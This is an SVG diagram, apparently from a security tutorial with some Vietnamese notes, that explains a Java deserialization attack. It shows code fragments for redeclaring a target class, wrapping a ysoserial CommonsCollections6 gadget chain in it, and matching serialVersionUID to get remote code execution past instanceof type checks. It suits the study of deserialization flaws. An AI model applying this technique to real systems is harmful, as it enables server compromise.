<svg viewBox="0 0 800 460" xmlns="http://www.w3.org/2000/svg"
     style="background:transparent;font-family:'Consolas','Monaco','Courier New',monospace;">
  <defs>
    <marker id="arrow" viewBox="0 0 10 10" refX="9" refY="5"
            markerWidth="8" markerHeight="8" orient="auto-start-reverse">
      <path d="M 0 0 L 10 5 L 0 10 z" fill="#abb2bf"/>
    </marker>
    <marker id="arrow-red" viewBox="0 0 10 10" refX="9" refY="5"
            markerWidth="8" markerHeight="8" orient="auto-start-reverse">
      <path d="M 0 0 L 10 5 L 0 10 z" fill="#e06c75"/>
    </marker>
  </defs>

  <text x="400" y="28" text-anchor="middle" font-size="15" font-weight="bold" fill="#abb2bf">Custom Java Gadget Chain — FieldValues Trick</text>

  <!-- Left side: Analysis -->
  <rect x="20" y="45" width="360" height="30" rx="6" fill="#c678dd" stroke="#a558bd"/>
  <text x="200" y="65" text-anchor="middle" font-size="12" font-weight="bold" fill="#ffffff">Step 1: Decompile Target JAR</text>

  <rect x="20" y="85" width="360" height="80" rx="6" fill="#4b5263" stroke="#3a3f4b"/>
  <text x="30" y="105" font-size="11" fill="#e5c07b">// Decompile with jadx / cfr</text>
  <text x="30" y="122" font-size="11" fill="#98c379">class ProductService implements Serializable {</text>
  <text x="30" y="138" font-size="11" fill="#e06c75">  private void readObject(ObjectInputStream in)</text>
  <text x="30" y="154" font-size="11" fill="#abb2bf">    throws IOException, ClassNotFoundException {</text>
  <text x="30" y="160" font-size="10" fill="#abb2bf">    // dangerous code here!</text>

  <rect x="20" y="175" width="360" height="30" rx="6" fill="#c678dd" stroke="#a558bd"/>
  <text x="200" y="195" text-anchor="middle" font-size="12" font-weight="bold" fill="#ffffff">Step 2: Identify FieldValues Trick</text>

  <rect x="20" y="215" width="360" height="90" rx="6" fill="#4b5263" stroke="#3a3f4b"/>
  <text x="30" y="233" font-size="11" fill="#e5c07b">// Redeclare class in your exploit project</text>
  <text x="30" y="250" font-size="11" fill="#98c379">package com.target.app; // SAME package!</text>
  <text x="30" y="267" font-size="11" fill="#98c379">class ProductService implements Serializable {</text>
  <text x="30" y="283" font-size="11" fill="#e06c75">  public Object gadget; // new field!</text>
  <text x="30" y="299" font-size="11" fill="#abb2bf">  // serialVersionUID must match!</text>

  <!-- Arrow from left to right -->
  <line x1="380" y1="260" x2="420" y2="260" stroke="#abb2bf" stroke-width="2" marker-end="url(#arrow)"/>
  <text x="400" y="250" text-anchor="middle" font-size="10" fill="#abb2bf">inject</text>

  <!-- Right side: Chain assembly -->
  <rect x="420" y="45" width="360" height="30" rx="6" fill="#61afef" stroke="#4090cf"/>
  <text x="600" y="65" text-anchor="middle" font-size="12" font-weight="bold" fill="#ffffff">Step 3: Assemble Gadget Chain</text>

  <rect x="420" y="85" width="360" height="130" rx="6" fill="#4b5263" stroke="#3a3f4b"/>
  <text x="430" y="105" font-size="11" fill="#e5c07b">// Wrap existing ysoserial gadget</text>
  <text x="430" y="122" font-size="11" fill="#98c379">ProductService outer = new ProductService();</text>
  <text x="430" y="139" font-size="11" fill="#98c379">outer.gadget = buildCC6Chain("id");</text>
  <text x="430" y="156" font-size="10" fill="#abb2bf">// CC6 chain inside app-specific wrapper</text>
  <text x="430" y="173" font-size="11" fill="#98c379">byte[] payload = serialize(outer);</text>
  <text x="430" y="190" font-size="11" fill="#abb2bf">// App expects ProductService type ✓</text>
  <text x="430" y="207" font-size="11" fill="#abb2bf">// But gadget triggers on readObject!</text>

  <!-- Step 4: serialVersionUID -->
  <rect x="420" y="225" width="360" height="30" rx="6" fill="#61afef" stroke="#4090cf"/>
  <text x="600" y="245" text-anchor="middle" font-size="12" font-weight="bold" fill="#ffffff">Step 4: Match serialVersionUID</text>

  <rect x="420" y="265" width="360" height="75" rx="6" fill="#4b5263" stroke="#3a3f4b"/>
  <text x="430" y="285" font-size="11" fill="#e5c07b">// Must match target class or deser fails</text>
  <text x="430" y="303" font-size="11" fill="#98c379">static final long serialVersionUID</text>
  <text x="430" y="320" font-size="11" fill="#98c379">  = 0x1234567890ABCDEFL; // from JAR</text>
  <text x="430" y="335" font-size="10" fill="#abb2bf">// Use: javap -verbose ProductService.class</text>

  <!-- Bottom: execution result -->
  <rect x="20" y="320" width="360" height="70" rx="6" fill="#4b5263" stroke="#3a3f4b"/>
  <text x="200" y="340" text-anchor="middle" font-size="12" font-weight="bold" fill="#e5c07b">Execution Flow</text>
  <text x="30" y="358" font-size="11" fill="#abb2bf">App: ois.readObject() → ProductService ✓</text>
  <text x="30" y="375" font-size="11" fill="#abb2bf">JVM calls readObject() on ProductService</text>
  <text x="30" y="391" font-size="11" fill="#e06c75">Dangerous code runs → triggers CC6 chain</text>

  <!-- Arrow to RCE -->
  <line x1="380" y1="358" x2="420" y2="358" stroke="#e06c75" stroke-width="2" marker-end="url(#arrow-red)"/>

  <rect x="420" y="350" width="360" height="50" rx="6" fill="#98c379" stroke="#78a359"/>
  <text x="600" y="373" text-anchor="middle" font-size="13" font-weight="bold" fill="#1e2127">RCE ✓ — even with type casting</text>
  <text x="600" y="391" text-anchor="middle" font-size="11" fill="#1e2127">App-specific class accepted; gadget triggered</text>

  <!-- Bypass note -->
  <rect x="20" y="400" width="760" height="45" rx="6" fill="#4b5263" stroke="#e5c07b" stroke-width="1"/>
  <text x="400" y="420" text-anchor="middle" font-size="11" font-weight="bold" fill="#e5c07b">FieldValues trick: vì serialVersionUID match + field names match → JVM accept redeclared class</text>
  <text x="400" y="437" text-anchor="middle" font-size="11" fill="#abb2bf">Bypasses type-checking defenses: `if (obj instanceof ExpectedClass)` — vẫn qua vì class name giống nhau</text>
</svg>
